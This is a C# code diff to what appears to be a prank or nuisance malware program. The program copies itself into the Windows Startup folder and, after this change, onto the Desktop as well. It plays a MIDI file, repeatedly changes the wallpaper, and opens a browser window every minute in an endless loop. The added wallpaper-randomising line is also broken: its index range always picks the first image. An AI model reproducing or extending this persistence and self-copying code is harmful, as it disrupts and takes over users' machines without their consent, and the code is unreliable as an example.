@@ -21,7 +21,7 @@ namespace SwiftedNet
 
         private const int DELAY_MINUTES = 1;
 
-        private const string RESOURCE_NAME = "bg.jpg";
+        private static readonly string[] RESOURCE_NAMES = new[] { "bg.jpg", "bg2.png" };
 
         private const string MIDI_RESOURCE_NAME = "bg.mid";
 
@@ -115,10 +115,12 @@ namespace SwiftedNet
 
             ExtractResource(MIDI_RESOURCE_NAME, MIDI_RESOURCE_NAME);
 
-            ChangeBackground(RESOURCE_NAME);
+            ChangeBackground(RESOURCE_NAMES[0]);
 
             CopySelfTo(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
-            
+
+            CopySelfTo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
+
             var rand = new Random(DateTime.Now.Day);
 
             while (true)
@@ -146,6 +148,10 @@ namespace SwiftedNet
 
                     OpenBrowser(textFile);
                 }
+
+                var backgroundIndex = rand.Next(0, RESOURCE_NAMES.Length - 1);
+
+                ChangeBackground(RESOURCE_NAMES[backgroundIndex]);
 
                 Thread.Sleep(TimeSpan.FromMinutes(DELAY_MINUTES));
             }
